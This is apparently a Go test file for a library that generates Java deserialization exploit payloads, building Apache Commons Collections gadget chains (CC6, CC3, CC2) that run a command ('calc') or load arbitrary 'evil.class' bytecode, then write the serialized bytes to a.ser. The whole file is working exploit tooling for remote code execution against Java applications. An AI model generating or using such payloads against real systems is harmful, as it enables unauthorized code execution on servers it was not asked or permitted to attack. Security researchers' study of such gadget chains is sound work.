package serlib

import (
	"fmt"
	serialize "goserja/impl"

	"io/ioutil"
	"os"
	"testing"
)

func write(data []byte) {
	err := os.WriteFile("a.ser", data, os.ModePerm)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("Serialized data (%d bytes):\n", len(data))
	fmt.Printf("% x\n", data)
}

func TestNewLazyMap(t *testing.T) {

	class := loadClass("org.apache.commons.collections.map.LazyMap")
	lazyMap := class.NewInstance(loader)
	fmt.Printf("lazyMap:%#v\n", lazyMap)
}

func TestCc6(t *testing.T) {
	cc6 := Cc6("calc")
	js := serialize.NewJavaSerializer()
	js.WriteObject(cc6)
	data := js.GetByteData()
	write(data)

	// 3 28 19 24 28 24 19 24 28 31 0
}

func TestCc3(t *testing.T) {
	bytecode, err := ioutil.ReadFile("evil.class")
	if err != nil {
		fmt.Println(err)
		return
	}
	cc3 := Cc3(bytecode)
	js := serialize.NewJavaSerializer()
	js.WriteObject(cc3)
	data := js.GetByteData()
	write(data)
}

func TestCc2(t *testing.T) {
	bytecode, err := ioutil.ReadFile("evil.class")
	if err != nil {
		fmt.Println(err)
		return
	}
	cc2 := Cc2(bytecode)
	js := serialize.NewJavaSerializer()
	js.WriteObject(cc2)
	data := js.GetByteData()
	write(data)
}
